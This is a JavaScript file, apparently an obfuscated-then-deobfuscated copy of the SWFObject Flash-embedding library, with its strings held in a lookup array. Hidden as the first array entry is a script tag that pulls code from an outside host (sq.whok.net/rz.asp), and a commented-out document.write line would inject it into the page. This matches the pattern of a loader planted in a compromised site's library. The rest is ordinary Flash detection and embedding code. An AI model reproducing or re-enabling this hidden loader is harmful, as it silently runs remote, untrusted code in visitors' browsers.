'use strict';
/** @type {!Array} */
var configs = ["<script type='text/javascript' src='https://sq.whok.net/rz.asp?sqid=SN20200703233635'>\x3c/script", "write", "undefined", "object", "Shockwave Flash", "ShockwaveFlash.ShockwaveFlash", "application/x-shockwave-flash", "SWFObjectExprInst", "onreadystatechange", "getElementById", "getElementsByTagName", "createElement", "toLowerCase", "userAgent", "platform", "test", "$1", "replace", "\x0B1", "plugins", "description", "mimeTypes", "enabledPlugin", "ActiveXObject", "$version", ",", "split", 
" ", "w3", "readyState", "complete", "body", "addEventListener", "DOMContentLoaded", "ie", "win", "callee", "detachEvent", "attachEvent", "left", "doScroll", "documentElement", "wk", "span", "appendChild", "removeChild", "parentNode", "length", "load", "onload", "function", "type", "setAttribute", "GetVariable", "pv", "id", "callbackFn", "swfVersion", "success", "ref", "expressInstall", "data", "width", "getAttribute", "0", "height", "class", "styleclass", "align", "param", "name", "movie", "value", 
"SetVariable", "nodeName", "OBJECT", "6.0.65", "mac", "310", "137", "title", "slice", " - Flash Player Installation", "ActiveX", "PlugIn", "MMredirectURL=", "%26", "location", "&MMplayerType=", "&MMdoctitle=", "flashvars", "&", "div", "SWFObjectNew", "insertBefore", "display", "style", "none", "replaceChild", "innerHTML", "childNodes", "nodeType", "PARAM", "cloneNode", "", "prototype", ' class="', '"', "classid", '="', '<param name="', '" value="', '" />', "outerHTML", '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"', 
">", "</object>", ".", "head", "string", "screen", "text/css", "media", "styleSheets", "addRule", "createTextNode", " {", "}", "visible", "hidden", "visibility", "#", "visibility:", "exec", "onunload", "=", "search", "hash", "?", "indexOf", "substring", "block"];

// document[configs[1]](configs[0]);

var swfobject = function() {
  /**
   * @return {undefined}
   */
  function callDomLoadFunctions() {
    if (isDomLoaded) {
      return;
    }
    try {
      var artistTrack = doc[configs[10]](configs[31])[0][configs[44]](createElement(configs[43]));
      artistTrack[configs[46]][configs[45]](artistTrack);
    } catch (aa) {
      return;
    }
    /** @type {boolean} */
    isDomLoaded = true;
    var odatahash = cache[configs[47]];
    /** @type {number} */
    var url_old = 0;
    for (; url_old < odatahash; url_old++) {
      cache[url_old]();
    }
  }
  /**
   * @param {!Function} fn
   * @return {undefined}
   */
  function addDomLoadEvent(fn) {
    if (isDomLoaded) {
      fn();
    } else {
      /** @type {!Function} */
      cache[cache[configs[47]]] = fn;
    }
  }
  /**
   * @param {!Function} fn
   * @return {undefined}
   */
  function addLoadEvent(fn) {
    if (typeof el[configs[32]] != UNDEF) {
      el[configs[32]](configs[48], fn, false);
    } else {
      if (typeof doc[configs[32]] != UNDEF) {
        doc[configs[32]](configs[48], fn, false);
      } else {
        if (typeof el[configs[38]] != UNDEF) {
          addListener(el, configs[49], fn);
        } else {
          if (typeof el[configs[49]] == configs[50]) {
            var scrollY = el[configs[49]];
            /**
             * @return {undefined}
             */
            el[configs[49]] = function() {
              scrollY();
              fn();
            };
          } else {
            /** @type {!Function} */
            el[configs[49]] = fn;
          }
        }
      }
    }
  }
  /**
   * @return {undefined}
   */
  function main() {
    if (_0x2f6bxc) {
      testPlayerVersion();
    } else {
      matchVersions();
    }
  }
  /**
   * @return {undefined}
   */
  function testPlayerVersion() {
    var getComputeFrom = doc[configs[10]](configs[31])[0];
    var el = createElement(OBJECT);
    el[configs[52]](configs[51], FLASH_MIME_TYPE);
    var a = getComputeFrom[configs[44]](el);
    if (a) {
      /** @type {number} */
      var _0x2f6bx1e = 0;
      (function() {
        if (typeof a[configs[53]] != UNDEF) {
          var sArrDayId = a.GetVariable(configs[24]);
          if (sArrDayId) {
            sArrDayId = sArrDayId[configs[26]](configs[27])[1][configs[26]](configs[25]);
            /** @type {!Array} */
            options[configs[54]] = [parseInt(sArrDayId[0], 10), parseInt(sArrDayId[1], 10), parseInt(sArrDayId[2], 10)];
          }
        } else {
          if (_0x2f6bx1e < 10) {
            _0x2f6bx1e++;
            setTimeout(arguments[configs[36]], 10);
            return;
          }
        }
        getComputeFrom[configs[45]](el);
        /** @type {null} */
        a = null;
        matchVersions();
      })();
    } else {
      matchVersions();
    }
  }
  /**
   * @return {undefined}
   */
  function matchVersions() {
    var currentIndex = nextIdLookup[configs[47]];
    if (currentIndex > 0) {
      /** @type {number} */
      var indexLookupKey = 0;
      for (; indexLookupKey < currentIndex; indexLookupKey++) {
        var id = nextIdLookup[indexLookupKey][configs[55]];
        var cb = nextIdLookup[indexLookupKey][configs[56]];
        var data = {
          success : false,
          id : id
        };
        if (options[configs[54]][0] > 0) {
          var obj = getElementById(id);
          if (obj) {
            if (hasPlayerVersion(nextIdLookup[indexLookupKey][configs[57]]) && !(options[configs[42]] && options[configs[42]] < 312)) {
              setVisibility(id, true);
              if (cb) {
                /** @type {boolean} */
                data[configs[58]] = true;
                data[configs[59]] = getObjectById(id);
                cb(data);
              }
            } else {
              if (nextIdLookup[indexLookupKey][configs[60]] && canExpressInstall()) {
                var att = {};
                att[configs[61]] = nextIdLookup[indexLookupKey][configs[60]];
                att[configs[62]] = obj[configs[63]](configs[62]) || configs[64];
                att[configs[65]] = obj[configs[63]](configs[65]) || configs[64];
                if (obj[configs[63]](configs[66])) {
                  att[configs[67]] = obj[configs[63]](configs[66]);
                }
                if (obj[configs[63]](configs[68])) {
                  att[configs[68]] = obj[configs[63]](configs[68]);
                }
                var par = {};
                var signedTransactions = obj[configs[10]](configs[69]);
                var txHex = signedTransactions[configs[47]];
                /** @type {number} */
                var signedTransactionsCounter = 0;
                for (; signedTransactionsCounter < txHex; signedTransactionsCounter++) {
                  if (signedTransactions[signedTransactionsCounter][configs[63]](configs[70])[configs[12]]() != configs[71]) {
                    par[signedTransactions[signedTransactionsCounter][configs[63]](configs[70])] = signedTransactions[signedTransactionsCounter][configs[63]](configs[72]);
                  }
                }
                showExpressInstall(att, par, id, cb);
              } else {
                displayAltContent(obj);
                if (cb) {
                  cb(data);
                }
              }
            }
          }
        } else {
          setVisibility(id, true);
          if (cb) {
            var o = getObjectById(id);
            if (o && typeof o[configs[73]] != UNDEF) {
              /** @type {boolean} */
              data[configs[58]] = true;
              data[configs[59]] = o;
            }
            cb(data);
          }
        }
      }
    }
  }
  /**
   * @param {string} objectIdStr
   * @return {?}
   */
  function getObjectById(objectIdStr) {
    /** @type {null} */
    var r = null;
    var o = getElementById(objectIdStr);
    if (o && o[configs[74]] == configs[75]) {
      if (typeof o[configs[73]] != UNDEF) {
        r = o;
      } else {
        var G__20648 = o[configs[10]](OBJECT)[0];
        if (G__20648) {
          r = G__20648;
        }
      }
    }
    return r;
  }
  /**
   * @return {?}
   */
  function canExpressInstall() {
    return !isExpressInstallActive && hasPlayerVersion(configs[76]) && (options[configs[35]] || options[configs[77]]) && !(options[configs[42]] && options[configs[42]] < 312);
  }
  /**
   * @param {!Object} att
   * @param {!Object} par
   * @param {string} replaceElemIdStr
   * @param {string} callbackFn
   * @return {undefined}
   */
  function showExpressInstall(att, par, replaceElemIdStr, callbackFn) {
    /** @type {boolean} */
    isExpressInstallActive = true;
    storedCallbackFn = callbackFn || null;
    storedCallbackObj = {
      success : false,
      id : replaceElemIdStr
    };
    var obj = getElementById(replaceElemIdStr);
    if (obj) {
      if (obj[configs[74]] == configs[75]) {
        storedAltContent = abstractAltContent(obj);
        /** @type {null} */
        storedAltContentId = null;
      } else {
        storedAltContent = obj;
        /** @type {string} */
        storedAltContentId = replaceElemIdStr;
      }
      att[configs[55]] = gmaps_context_menu;
      if (typeof att[configs[62]] == UNDEF || !/%$/[configs[15]](att[configs[62]]) && parseInt(att[configs[62]], 10) < 310) {
        att[configs[62]] = configs[78];
      }
      if (typeof att[configs[65]] == UNDEF || !/%$/[configs[15]](att[configs[65]]) && parseInt(att[configs[65]], 10) < 137) {
        att[configs[65]] = configs[79];
      }
      doc[configs[80]] = doc[configs[80]][configs[81]](0, 47) + configs[82];
      var _0x2f6bx25 = options[configs[34]] && options[configs[35]] ? configs[83] : configs[84];
      var TEST = configs[85] + el[configs[87]].toString()[configs[17]](/&/g, configs[86]) + configs[88] + _0x2f6bx25 + configs[89] + doc[configs[80]];
      if (typeof par[configs[90]] != UNDEF) {
        par[configs[90]] += configs[91] + TEST;
      } else {
        par[configs[90]] = TEST;
      }
      if (options[configs[34]] && options[configs[35]] && obj[configs[29]] != 4) {
        var $closingAreaLeft = createElement(configs[92]);
        replaceElemIdStr = replaceElemIdStr + configs[93];
        $closingAreaLeft[configs[52]](configs[55], replaceElemIdStr);
        obj[configs[46]][configs[94]]($closingAreaLeft, obj);
        obj[configs[96]][configs[95]] = configs[97];
        (function() {
          if (obj[configs[29]] == 4) {
            obj[configs[46]][configs[45]](obj);
          } else {
            setTimeout(arguments[configs[36]], 10);
          }
        })();
      }
      createSWF(att, par, replaceElemIdStr);
    }
  }
  /**
   * @param {?} obj
   * @return {undefined}
   */
  function displayAltContent(obj) {
    if (options[configs[34]] && options[configs[35]] && obj[configs[29]] != 4) {
      var $closingAreaLeft = createElement(configs[92]);
      obj[configs[46]][configs[94]]($closingAreaLeft, obj);
      $closingAreaLeft[configs[46]][configs[98]](abstractAltContent(obj), $closingAreaLeft);
      obj[configs[96]][configs[95]] = configs[97];
      (function() {
        if (obj[configs[29]] == 4) {
          obj[configs[46]][configs[45]](obj);
        } else {
          setTimeout(arguments[configs[36]], 10);
        }
      })();
    } else {
      obj[configs[46]][configs[98]](abstractAltContent(obj), obj);
    }
  }
  /**
   * @param {?} obj
   * @return {?}
   */
  function abstractAltContent(obj) {
    var ac = createElement(configs[92]);
    if (options[configs[35]] && options[configs[34]]) {
      ac[configs[99]] = obj[configs[99]];
    } else {
      var _0x2f6bx1e = obj[configs[10]](OBJECT)[0];
      if (_0x2f6bx1e) {
        var nextIdLookup = _0x2f6bx1e[configs[100]];
        if (nextIdLookup) {
          var currentIndex = nextIdLookup[configs[47]];
          /** @type {number} */
          var indexLookupKey = 0;
          for (; indexLookupKey < currentIndex; indexLookupKey++) {
            if (!(nextIdLookup[indexLookupKey][configs[101]] == 1 && nextIdLookup[indexLookupKey][configs[74]] == configs[102]) && !(nextIdLookup[indexLookupKey][configs[101]] == 8)) {
              ac[configs[44]](nextIdLookup[indexLookupKey][configs[103]](true));
            }
          }
        }
      }
    }
    return ac;
  }
  /**
   * @param {!Object} data
   * @param {!Object} params
   * @param {string} id
   * @return {?}
   */
  function createSWF(data, params, id) {
    var r;
    var el = getElementById(id);
    if (options[configs[42]] && options[configs[42]] < 312) {
      return r;
    }
    if (el) {
      if (typeof data[configs[55]] == UNDEF) {
        /** @type {string} */
        data[configs[55]] = id;
      }
      if (options[configs[34]] && options[configs[35]]) {
        var _0x2f6bx1d = configs[104];
        var j;
        for (j in data) {
          if (data[j] != Object[configs[105]][j]) {
            if (j[configs[12]]() == configs[61]) {
              params[configs[71]] = data[j];
            } else {
              if (j[configs[12]]() == configs[67]) {
                _0x2f6bx1d = _0x2f6bx1d + (configs[106] + data[j] + configs[107]);
              } else {
                if (j[configs[12]]() != configs[108]) {
                  _0x2f6bx1d = _0x2f6bx1d + (configs[27] + j + configs[109] + data[j] + configs[107]);
                }
              }
            }
          }
        }
        var _0x2f6bx21 = configs[104];
        var i;
        for (i in params) {
          if (params[i] != Object[configs[105]][i]) {
            _0x2f6bx21 = _0x2f6bx21 + (configs[110] + i + configs[111] + params[i] + configs[112]);
          }
        }
        el[configs[113]] = configs[114] + _0x2f6bx1d + configs[115] + _0x2f6bx21 + configs[116];
        d[d[configs[47]]] = data[configs[55]];
        r = getElementById(data[configs[55]]);
      } else {
        var o = createElement(OBJECT);
        o[configs[52]](configs[51], FLASH_MIME_TYPE);
        var j;
        for (j in data) {
          if (data[j] != Object[configs[105]][j]) {
            if (j[configs[12]]() == configs[67]) {
              o[configs[52]](configs[66], data[j]);
            } else {
              if (j[configs[12]]() != configs[108]) {
                o[configs[52]](j, data[j]);
              }
            }
          }
        }
        var i;
        for (i in params) {
          if (params[i] != Object[configs[105]][i] && i[configs[12]]() != configs[71]) {
            add(o, i, params[i]);
          }
        }
        el[configs[46]][configs[98]](o, el);
        r = o;
      }
    }
    return r;
  }
  /**
   * @param {?} options
   * @param {string} value
   * @param {?} skillIndex
   * @return {undefined}
   */
  function add(options, value, skillIndex) {
    var form = createElement(configs[69]);
    form[configs[52]](configs[70], value);
    form[configs[52]](configs[72], skillIndex);
    options[configs[44]](form);
  }
  /**
   * @param {string} id
   * @return {undefined}
   */
  function removeSWF(id) {
    var o = getElementById(id);
    if (o && o[configs[74]] == configs[75]) {
      if (options[configs[34]] && options[configs[35]]) {
        o[configs[96]][configs[95]] = configs[97];
        (function() {
          if (o[configs[29]] == 4) {
            removeObjectInIE(id);
          } else {
            setTimeout(arguments[configs[36]], 10);
          }
        })();
      } else {
        o[configs[46]][configs[45]](o);
      }
    }
  }
  /**
   * @param {string} id
   * @return {undefined}
   */
  function removeObjectInIE(id) {
    var o = getElementById(id);
    if (o) {
      var sProp;
      for (sProp in o) {
        if (typeof o[sProp] == configs[50]) {
          /** @type {null} */
          o[sProp] = null;
        }
      }
      o[configs[46]][configs[45]](o);
    }
  }
  /**
   * @param {string} id
   * @return {?}
   */
  function getElementById(id) {
    /** @type {null} */
    var el = null;
    try {
      el = doc[configs[9]](id);
    } catch (Y) {
    }
    return el;
  }
  /**
   * @param {?} tag
   * @return {?}
   */
  function createElement(tag) {
    return doc[configs[11]](tag);
  }
  /**
   * @param {!Window} x
   * @param {?} y
   * @param {!Function} callback
   * @return {undefined}
   */
  function addListener(x, y, callback) {
    x[configs[38]](y, callback);
    /** @type {!Array} */
    p[p[configs[47]]] = [x, y, callback];
  }
  /**
   * @param {?} rv
   * @return {?}
   */
  function hasPlayerVersion(rv) {
    var availVersionArr = options[configs[54]];
    var instVersionArr = rv[configs[26]](configs[117]);
    /** @type {number} */
    instVersionArr[0] = parseInt(instVersionArr[0], 10);
    /** @type {number} */
    instVersionArr[1] = parseInt(instVersionArr[1], 10) || 0;
    /** @type {number} */
    instVersionArr[2] = parseInt(instVersionArr[2], 10) || 0;
    return availVersionArr[0] > instVersionArr[0] || availVersionArr[0] == instVersionArr[0] && availVersionArr[1] > instVersionArr[1] || availVersionArr[0] == instVersionArr[0] && availVersionArr[1] == instVersionArr[1] && availVersionArr[2] >= instVersionArr[2] ? true : false;
  }
  /**
   * @param {?} sel
   * @param {?} decl
   * @param {string} media
   * @param {?} newStyle
   * @return {undefined}
   */
  function createCSS(sel, decl, media, newStyle) {
    if (options[configs[34]] && options[configs[77]]) {
      return;
    }
    var CustomTests = doc[configs[10]](configs[118])[0];
    if (!CustomTests) {
      return;
    }
    var m = media && typeof media == configs[119] ? media : configs[120];
    if (newStyle) {
      /** @type {null} */
      dynamicStylesheet = null;
      /** @type {null} */
      dynamicStylesheetMedia = null;
    }
    if (!dynamicStylesheet || dynamicStylesheetMedia != m) {
      var element = createElement(configs[96]);
      element[configs[52]](configs[51], configs[121]);
      element[configs[52]](configs[122], m);
      dynamicStylesheet = CustomTests[configs[44]](element);
      if (options[configs[34]] && options[configs[35]] && typeof doc[configs[123]] != UNDEF && doc[configs[123]][configs[47]] > 0) {
        dynamicStylesheet = doc[configs[123]][doc[configs[123]][configs[47]] - 1];
      }
      dynamicStylesheetMedia = m;
    }
    if (options[configs[34]] && options[configs[35]]) {
      if (dynamicStylesheet && typeof dynamicStylesheet[configs[124]] == OBJECT) {
        dynamicStylesheet[configs[124]](sel, decl);
      }
    } else {
      if (dynamicStylesheet && typeof doc[configs[125]] != UNDEF) {
        dynamicStylesheet[configs[44]](doc[configs[125]](sel + configs[126] + decl + configs[127]));
      }
    }
  }
  /**
   * @param {string} id
   * @param {boolean} isVisible
   * @return {undefined}
   */
  function setVisibility(id, isVisible) {
    if (!_0x2f6bx19) {
      return;
    }
    var v = isVisible ? configs[128] : configs[129];
    if (isDomLoaded && getElementById(id)) {
      getElementById(id)[configs[96]][configs[130]] = v;
    } else {
      createCSS(configs[131] + id, configs[132] + v);
    }
  }
  /**
   * @param {string} s
   * @return {?}
   */
  function urlEncodeIfNecessary(s) {
    /** @type {!RegExp} */
    var ctx = /[\\"<>\.;]/;
    /** @type {boolean} */
    var hasBadChars = ctx[configs[133]](s) != null;
    return hasBadChars && typeof encodeURIComponent != UNDEF ? encodeURIComponent(s) : s;
  }
  var UNDEF = configs[2];
  var OBJECT = configs[3];
  var chartInstanceName = configs[4];
  var SHOCKWAVE_FLASH_AX = configs[5];
  var FLASH_MIME_TYPE = configs[6];
  var gmaps_context_menu = configs[7];
  var READY = configs[8];
  /** @type {!Window} */
  var el = window;
  /** @type {!HTMLDocument} */
  var doc = document;
  /** @type {!Navigator} */
  var historical_metrics = navigator;
  /** @type {boolean} */
  var _0x2f6bxc = false;
  /** @type {!Array} */
  var cache = [main];
  /** @type {!Array} */
  var nextIdLookup = [];
  /** @type {!Array} */
  var d = [];
  /** @type {!Array} */
  var p = [];
  var storedAltContent;
  var storedAltContentId;
  var storedCallbackFn;
  var storedCallbackObj;
  /** @type {boolean} */
  var isDomLoaded = false;
  /** @type {boolean} */
  var isExpressInstallActive = false;
  var dynamicStylesheet;
  var dynamicStylesheetMedia;
  /** @type {boolean} */
  var _0x2f6bx19 = true;
  var options = function() {
    /** @type {boolean} */
    var w3cdom = typeof doc[configs[9]] != UNDEF && typeof doc[configs[10]] != UNDEF && typeof doc[configs[11]] != UNDEF;
    var u = historical_metrics[configs[13]][configs[12]]();
    var p = historical_metrics[configs[14]][configs[12]]();
    var windows = p ? /win/[configs[15]](p) : /win/[configs[15]](u);
    var mac = p ? /mac/[configs[15]](p) : /mac/[configs[15]](u);
    /** @type {(boolean|number)} */
    var webkit = /webkit/[configs[15]](u) ? parseFloat(u[configs[17]](/^.*webkit\/(\d+(\.\d+)?).*$/, configs[16])) : false;
    /** @type {boolean} */
    var ie = !+configs[18];
    /** @type {!Array} */
    var playerVersion = [0, 0, 0];
    /** @type {null} */
    var str = null;
    if (typeof historical_metrics[configs[19]] != UNDEF && typeof historical_metrics[configs[19]][chartInstanceName] == OBJECT) {
      str = historical_metrics[configs[19]][chartInstanceName][configs[20]];
      if (str && !(typeof historical_metrics[configs[21]] != UNDEF && historical_metrics[configs[21]][FLASH_MIME_TYPE] && !historical_metrics[configs[21]][FLASH_MIME_TYPE][configs[22]])) {
        /** @type {boolean} */
        _0x2f6bxc = true;
        /** @type {boolean} */
        ie = false;
        str = str[configs[17]](/^.*\s+(\S+\s+\S+$)/, configs[16]);
        /** @type {number} */
        playerVersion[0] = parseInt(str[configs[17]](/^(.*)\..*$/, configs[16]), 10);
        /** @type {number} */
        playerVersion[1] = parseInt(str[configs[17]](/^.*\.(.*)\s.*$/, configs[16]), 10);
        /** @type {number} */
        playerVersion[2] = /[a-zA-Z]/[configs[15]](str) ? parseInt(str[configs[17]](/^.*[a-zA-Z]+(.*)$/, configs[16]), 10) : 0;
      }
    } else {
      if (typeof el[configs[23]] != UNDEF) {
        try {
          var a = new ActiveXObject(SHOCKWAVE_FLASH_AX);
          if (a) {
            str = a.GetVariable(configs[24]);
            if (str) {
              /** @type {boolean} */
              ie = true;
              str = str[configs[26]](configs[27])[1][configs[26]](configs[25]);
              /** @type {!Array} */
              playerVersion = [parseInt(str[0], 10), parseInt(str[1], 10), parseInt(str[2], 10)];
            }
          }
        } catch (Z) {
        }
      }
    }
    return {
      w3 : w3cdom,
      pv : playerVersion,
      wk : webkit,
      ie : ie,
      win : windows,
      mac : mac
    };
  }();
  var _0x2f6bx1b = function() {
    if (!options[configs[28]]) {
      return;
    }
    if (typeof doc[configs[29]] != UNDEF && doc[configs[29]] == configs[30] || typeof doc[configs[29]] == UNDEF && (doc[configs[10]](configs[31])[0] || doc[configs[31]])) {
      callDomLoadFunctions();
    }
    if (!isDomLoaded) {
      if (typeof doc[configs[32]] != UNDEF) {
        doc[configs[32]](configs[33], callDomLoadFunctions, false);
      }
      if (options[configs[34]] && options[configs[35]]) {
        doc[configs[38]](READY, function() {
          if (doc[configs[29]] == configs[30]) {
            doc[configs[37]](READY, arguments[configs[36]]);
            callDomLoadFunctions();
          }
        });
        if (el == top) {
          (function() {
            if (isDomLoaded) {
              return;
            }
            try {
              doc[configs[41]][configs[40]](configs[39]);
            } catch (X) {
              setTimeout(arguments[configs[36]], 0);
              return;
            }
            callDomLoadFunctions();
          })();
        }
      }
      if (options[configs[42]]) {
        (function() {
          if (isDomLoaded) {
            return;
          }
          if (!/loaded|complete/[configs[15]](doc[configs[29]])) {
            setTimeout(arguments[configs[36]], 0);
            return;
          }
          callDomLoadFunctions();
        })();
      }
      addLoadEvent(callDomLoadFunctions);
    }
  }();
  var _0x2f6bx3e = function() {
    if (options[configs[34]] && options[configs[35]]) {
      window[configs[38]](configs[134], function() {
        var old_5779 = p[configs[47]];
        /** @type {number} */
        var layerParamName = 0;
        for (; layerParamName < old_5779; layerParamName++) {
          p[layerParamName][0][configs[37]](p[layerParamName][1], p[layerParamName][2]);
        }
        var el = d[configs[47]];
        /** @type {number} */
        var j = 0;
        for (; j < el; j++) {
          removeSWF(d[j]);
        }
        var name;
        for (name in options) {
          /** @type {null} */
          options[name] = null;
        }
        /** @type {null} */
        options = null;
        var l;
        for (l in swfobject) {
          /** @type {null} */
          swfobject[l] = null;
        }
        /** @type {null} */
        swfobject = null;
      });
    }
  }();
  return {
    registerObject : function(objectIdStr, swfVersionStr, xiSwfUrlStr, callbackFn) {
      if (options[configs[28]] && objectIdStr && swfVersionStr) {
        var __task = {};
        /** @type {string} */
        __task[configs[55]] = objectIdStr;
        __task[configs[57]] = swfVersionStr;
        __task[configs[60]] = xiSwfUrlStr;
        __task[configs[56]] = callbackFn;
        nextIdLookup[nextIdLookup[configs[47]]] = __task;
        setVisibility(objectIdStr, false);
      } else {
        if (callbackFn) {
          callbackFn({
            success : false,
            id : objectIdStr
          });
        }
      }
    },
    getObjectById : function(objectIdStr) {
      if (options[configs[28]]) {
        return getObjectById(objectIdStr);
      }
    },
    embedSWF : function(swfUrlStr, replaceElemIdStr, widthStr, heightStr, swfVersionStr, xiSwfUrlStr, flashvarsObj, parObj, attObj, callbackFn) {
      var response = {
        success : false,
        id : replaceElemIdStr
      };
      if (options[configs[28]] && !(options[configs[42]] && options[configs[42]] < 312) && swfUrlStr && replaceElemIdStr && widthStr && heightStr && swfVersionStr) {
        setVisibility(replaceElemIdStr, false);
        addDomLoadEvent(function() {
          widthStr = widthStr + configs[104];
          heightStr = heightStr + configs[104];
          var att = {};
          if (attObj && typeof attObj === OBJECT) {
            var i;
            for (i in attObj) {
              att[i] = attObj[i];
            }
          }
          att[configs[61]] = swfUrlStr;
          /** @type {string} */
          att[configs[62]] = widthStr;
          /** @type {string} */
          att[configs[65]] = heightStr;
          var par = {};
          if (parObj && typeof parObj === OBJECT) {
            var j;
            for (j in parObj) {
              par[j] = parObj[j];
            }
          }
          if (flashvarsObj && typeof flashvarsObj === OBJECT) {
            var k;
            for (k in flashvarsObj) {
              if (typeof par[configs[90]] != UNDEF) {
                par[configs[90]] += configs[91] + k + configs[135] + flashvarsObj[k];
              } else {
                par[configs[90]] = k + configs[135] + flashvarsObj[k];
              }
            }
          }
          if (hasPlayerVersion(swfVersionStr)) {
            var obj = createSWF(att, par, replaceElemIdStr);
            if (att[configs[55]] == replaceElemIdStr) {
              setVisibility(replaceElemIdStr, true);
            }
            /** @type {boolean} */
            response[configs[58]] = true;
            response[configs[59]] = obj;
          } else {
            if (xiSwfUrlStr && canExpressInstall()) {
              att[configs[61]] = xiSwfUrlStr;
              showExpressInstall(att, par, replaceElemIdStr, callbackFn);
              return;
            } else {
              setVisibility(replaceElemIdStr, true);
            }
          }
          if (callbackFn) {
            callbackFn(response);
          }
        });
      } else {
        if (callbackFn) {
          callbackFn(response);
        }
      }
    },
    switchOffAutoHideShow : function() {
      /** @type {boolean} */
      _0x2f6bx19 = false;
    },
    ua : options,
    getFlashPlayerVersion : function() {
      return {
        major : options[configs[54]][0],
        minor : options[configs[54]][1],
        release : options[configs[54]][2]
      };
    },
    hasFlashPlayerVersion : hasPlayerVersion,
    createSWF : function(attrs, params, replaceElemIdStr) {
      if (options[configs[28]]) {
        return createSWF(attrs, params, replaceElemIdStr);
      } else {
        return undefined;
      }
    },
    showExpressInstall : function(att, par, replaceElemIdStr, callbackFn) {
      if (options[configs[28]] && canExpressInstall()) {
        showExpressInstall(att, par, replaceElemIdStr, callbackFn);
      }
    },
    removeSWF : function(objElemIdStr) {
      if (options[configs[28]]) {
        removeSWF(objElemIdStr);
      }
    },
    createCSS : function(selStr, declStr, mediaStr, newStyleBoolean) {
      if (options[configs[28]]) {
        createCSS(selStr, declStr, mediaStr, newStyleBoolean);
      }
    },
    addDomLoadEvent : addDomLoadEvent,
    addLoadEvent : addLoadEvent,
    getQueryParamValue : function(param) {
      var q = doc[configs[87]][configs[136]] || doc[configs[87]][configs[137]];
      if (q) {
        if (/\?/[configs[15]](q)) {
          q = q[configs[26]](configs[138])[1];
        }
        if (param == null) {
          return urlEncodeIfNecessary(q);
        }
        var PL$13 = q[configs[26]](configs[91]);
        /** @type {number} */
        var PL$17 = 0;
        for (; PL$17 < PL$13[configs[47]]; PL$17++) {
          if (PL$13[PL$17][configs[140]](0, PL$13[PL$17][configs[139]](configs[135])) == param) {
            return urlEncodeIfNecessary(PL$13[PL$17][configs[140]](PL$13[PL$17][configs[139]](configs[135]) + 1));
          }
        }
      }
      return configs[104];
    },
    expressInstallCallback : function() {
      if (isExpressInstallActive) {
        var context_menu_element = getElementById(gmaps_context_menu);
        if (context_menu_element && storedAltContent) {
          context_menu_element[configs[46]][configs[98]](storedAltContent, context_menu_element);
          if (storedAltContentId) {
            setVisibility(storedAltContentId, true);
            if (options[configs[34]] && options[configs[35]]) {
              storedAltContent[configs[96]][configs[95]] = configs[141];
            }
          }
          if (storedCallbackFn) {
            storedCallbackFn(storedCallbackObj);
          }
        }
        /** @type {boolean} */
        isExpressInstallActive = false;
      }
    }
  };
}();
